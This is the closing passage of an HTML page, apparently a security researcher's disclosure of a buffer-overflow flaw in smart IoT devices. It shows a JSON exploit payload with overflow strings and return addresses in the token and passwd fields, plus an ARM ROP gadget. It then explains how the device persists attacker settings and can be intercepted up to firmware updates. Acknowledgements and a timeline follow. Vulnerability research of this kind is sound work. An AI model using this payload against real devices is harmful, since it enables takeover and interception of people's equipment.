</span></span><span class=line><span class=cl>    <span class=nt>&#34;ap_ssid&#34;</span><span class=p>:</span><span class=s2>&#34;A&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;ssid&#34;</span><span class=p>:</span><span class=s2>&#34;A&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;token&#34;</span><span class=p>:</span><span class=s2>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb9\x94\x0b&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;passwd&#34;</span><span class=p>:</span><span class=s2>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x15\xd5\x0a&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Where the intermediate gadget at <code>0x000b94b8</code> is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-armasm data-lang=armasm><span class=line><span class=cl>adds <span class=nc>r0</span>, <span class=nc>r7</span>, #<span class=mi>0</span>
</span></span><span class=line><span class=cl>ldr <span class=nc>r1</span>, <span class=err>[sp</span>, #<span class=mi>8</span><span class=err>]</span>
</span></span><span class=line><span class=cl>ldr <span class=nc>r3</span>, <span class=err>[</span><span class=nc>r5</span>, #<span class=mh>0x20</span><span class=err>]</span>
</span></span><span class=line><span class=cl>blx <span class=nc>r3</span>
</span></span></code></pre></div><p>And the final target in the middle of the test function is at address <code>0x000ad514</code>. Once the device gets the message, it persists our chosen parameters to flash and hangs. After a reboot, it starts up again with our parameters, allowing us to properly MITM its communication and subsequently get as far as OTA firmware updates.</p><h2 id=acknowledgements><a class=anchor href=#acknowledgements title='Anchor for "Acknowledgements".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a>Acknowledgements</h2><p>We would like to thank <a href=https://twitter.com/jilles_com>Jilles Groenendijk</a> for his massive help with disassembling, dissecting and dumping the firmware for many smart device models throughout the process of validating exploitability.</p><h2 id=timeline><a class=anchor href=#timeline title='Anchor for "Timeline".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a>Timeline</h2><p><span style="display:block;margin:0 auto"><img loading=lazy src=/assets/blog/img/ad7b19d7bed9832e50b8c5e49552ef9766bb78c9b2eb3cd5fe21b9102604086b.jpeg alt="Timeline image"></span></p></article></main></div><footer><section class=req-js><button class=outline-dashed title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="#adjust"/></svg></button><input class=outline-dashed type=color list=presets value=#f27466 title="Change accent color." aria-label="Change accent color."><datalist id=presets><option value=#225670><option value=#f27466><option value=#1f676b><option value=#f3a530><option value=#902b37><option value=#1dbc91><option value=#754e85><option value=#7fc121><option value=#a8314a><option value=#ff7433><option value=#3e6728><option value=#c063bd></datalist></section><p>Rendered by <a href=https://gohugo.io>Hugo</a><br>Theme is <a href=https://gitlab.com/rmaguiar/hugo-theme-color-your-world>Color Your World</a> by <a href=https://gitlab.com/rmaguiar>Raphael Aguiar<a></p></footer><svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" aria-hidden="true"><symbol viewBox="0 0 512 512" id="adjust"><path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705.0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/></symbol><symbol viewBox="0 0 448 512" id="hashtag"><path d="M440.667 182.109l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l14.623-81.891C377.123 38.754 371.468 32 363.997 32h-40.632a12 12 0 00-11.813 9.891L296.175 128H197.54l14.623-81.891C213.477 38.754 207.822 32 200.35 32h-40.632a12 12 0 00-11.813 9.891L132.528 128H53.432a12 12 0 00-11.813 9.891l-7.143 40C33.163 185.246 38.818 192 46.289 192h74.81L98.242 320H19.146a12 12 0 00-11.813 9.891l-7.143 40C-1.123 377.246 4.532 384 12.003 384h74.81L72.19 465.891C70.877 473.246 76.532 480 84.003 480h40.632a12 12 0 0011.813-9.891L151.826 384h98.634l-14.623 81.891C234.523 473.246 240.178 480 247.65 480h40.632a12 12 0 0011.813-9.891L315.472 384h79.096a12 12 0 0011.813-9.891l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l22.857-128h79.096a12 12 0 0011.813-9.891zM261.889 320h-98.634l22.857-128h98.634l-22.857 128z"/></symbol><symbol viewBox="0 0 320 512" id="caret-down"><path d="M31.3 192h257.3c17.8.0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3.0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"/></symbol></svg><script>"use strict";const PALETTE=document.querySelector("footer input");PALETTE.onchange=function(){const e=PALETTE.value;SHEET.setProperty("--accent",e),ROOT.dataset.mode==="light"?localStorage.setItem("lightAccent",e):localStorage.setItem("darkAccent",e),updateAccent()}</script></body></html>